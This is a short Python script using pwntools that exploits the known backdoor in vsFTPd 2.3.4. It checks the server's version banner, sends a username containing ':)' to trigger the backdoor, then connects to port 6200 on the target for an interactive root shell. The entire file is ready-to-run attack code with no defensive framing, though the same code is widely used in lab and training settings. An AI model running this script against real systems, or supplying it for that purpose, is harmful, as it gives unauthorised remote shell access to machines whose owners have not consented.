#!/usr/bin/python3

from pwn import *
from sys import exit
from time import sleep

class ExploitFTP:
	def __init__(self,ip,port=21):
		self.ip = ip
		self.port = port
		self.p = log.progress("")

	def trigger_backdoor(self):
		self.p.status("Checking Version...")
		io = remote(self.ip,self.port)
		io.recvuntil(b"vsFTPd ")
		version = (io.recvuntil(b")")[:-1]).decode()
		if version != "2.3.4":
			self.p.failure("Version 2.3.4 Not Found!!!")
			exit()
		else:
			self.p.status("Triggering Backdoor....")
			io.sendline(b"USER hello:)")
			io.sendline(b"PASS hello123")
			io.close()

	def get_shell(self):
		self.p.status("Connecting To Backdoor...")
		sleep(1)
		io = remote(self.ip, 6200)
		self.p.success("Got Shell!!!")
		io.interactive()
		io.close()

if __name__ == "__main__":
	if len(sys.argv) < 2 or len(sys.argv) > 3:
		error(f"Usage: {sys.argv[0]} IP PORT(optional)")

	if len(sys.argv) == 3:
		exploit = ExploitFTP(sys.argv[1],sys.argv[2])
	else:
		exploit = ExploitFTP(sys.argv[1])

	exploit.trigger_backdoor()
	exploit.get_shell()
